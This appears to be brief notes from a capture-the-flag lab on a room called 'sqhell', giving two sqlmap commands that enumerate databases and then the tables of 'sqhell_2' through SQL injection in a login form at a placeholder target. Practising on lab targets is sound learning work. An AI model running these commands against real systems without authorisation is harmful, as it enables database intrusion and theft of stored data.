#1 To know which tables are exist and available
``` 
sqlmap -u "http://<IP-Target>/login" --data="username=admin&password=admin" --batch --dbs
```

#2 Check sqhell_2 tables 

```
sqlmap -u "http://<IP-Target>/login" --data="username=admin&password=admin" -D sqhell_2 --tables --batch
```

